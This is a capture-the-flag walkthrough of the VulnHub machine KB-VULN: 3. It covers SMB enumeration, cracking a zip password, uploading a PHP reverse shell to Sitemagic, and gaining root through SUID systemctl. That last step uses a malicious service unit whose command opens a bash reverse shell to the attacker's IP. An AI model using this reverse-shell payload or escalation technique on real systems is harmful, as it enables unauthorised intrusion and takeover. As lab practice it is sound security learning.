## Introduction
*This machine is the kind that will measure your research ability. This VM is running on VirtualBox. It includes 2 flags:user.txt and root.txt.*

This is [KB-VULN: 3](https://www.vulnhub.com/entry/kb-vuln-3,579/) from vulnhub. After doing Tenderfoot I rolled straight into this one and knocked it over too.

## Ports
This box has:

1. 22/tcp  open  ssh
2. 80/tcp  open  http
3. 139/tcp open  netbios-ssn
4. 445/tcp open  microsoft-ds

So, SSH, HTTP and SMB; gotcha.


## SMB
We have anonymous login to SMB; I used nautilus. I've been liking it lately.

In the share we find *website.zip* which has a password protected note file in it. No problem:

{% highlight shell %}
root@kali:/opt/vulnhub/kbvuln3# john website.john -w=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
porchman         (website.zip)

Use the "--show" option to display all of the cracked passwords reliably

What's the contents?

>Hi Heisenberg! Your website is activated. --> kb.vuln  
Username  : admin  
Password  : jesse  
Have a good day !  

So we have some credentials. Let's check out the website. Also I added *kb.vuln* to /etc/hosts, but it probably wasn't necessary.

## Website
The website is running Sitemagic, same as [Cewlkid: 1](https://blog.gibbons.digital/hacking/2020/09/22/cewl.html). So we have arbitrary PHP file upload. I use the GUI to upload a shell and find it at:

>http://kb.vuln/files/rev-plugin.php

Note: the file is called plugin because I originally used it for a Wordpress thing. It's nothing special, just a bash reverse shell.

I catch the shell in a listener and we're away.

## Privesc
We've only got one prominent user (*heisenberg*) and they're in the sudo group so we're probably going there or direct to root. Linpeas says *systemctl* has the SUID bit set; so that's our method.

[GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#suid) has a technique, but it fails. Hmmm. I try a slightly different custom service, but get an error:

>Failed to lookup unit file state: Invalid argument

There doesn't appear to be anything wrong with the service file, but the system isn't happy. After some trawling through stackoverflow and other places, I visit */etc/systemd/system/multi-user.target.wants* and find a broken symlink:

>0 lrwxrwxrwx  1 root root   29 Oct  2 18:53 root.service -> /home/heisenberg/root.service

The */home/heisenberg/root.service* file does not exist. I can't remove it with *rm*; I don't have permission. However:

{% highlight shell %}
www-data@kb-server:/etc/systemd/system/multi-user.target.wants$ systemctl disable root.service
<i-user.target.wants$ systemctl disable root.service            
Removed /etc/systemd/system/multi-user.target.wants/root.service.
Removed /etc/systemd/system/root.service.
{% endhighlight %}

This got rid of the problem. On to root!

My service looked like this:
{% highlight shell %}
root@kali:/opt/vulnhub/kbvuln3# cat toor.service 
[Unit]
Description=Whatever

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.77/1235 0>&1"

[Install]
WantedBy=multi-user.target
{% endhighlight %}

And it was located in */dev/shm*. With the broken symlink out of the way:

{% highlight shell %}
www-data@kb-server:/etc/systemd/system/multi-user.target.wants$ systemctl enable /dev/shm/toor.service
<arget.wants$ systemctl enable /dev/shm/toor.service            
Created symlink /etc/systemd/system/multi-user.target.wants/toor.service -> /dev/shm/toor.service.
Created symlink /etc/systemd/system/toor.service -> /dev/shm/toor.service.
www-data@kb-server:/etc/systemd/system/multi-user.target.wants$ systemctl start toor
<ystem/multi-user.target.wants$ systemctl start toor            
www-data@kb-server:/etc/systemd/system/multi-user.target.wants$
{% endhighlight %}

And in my listener:

{% highlight shell %}
root@kali:/opt/vulnhub/kbvuln3# nc -nvlp 1235
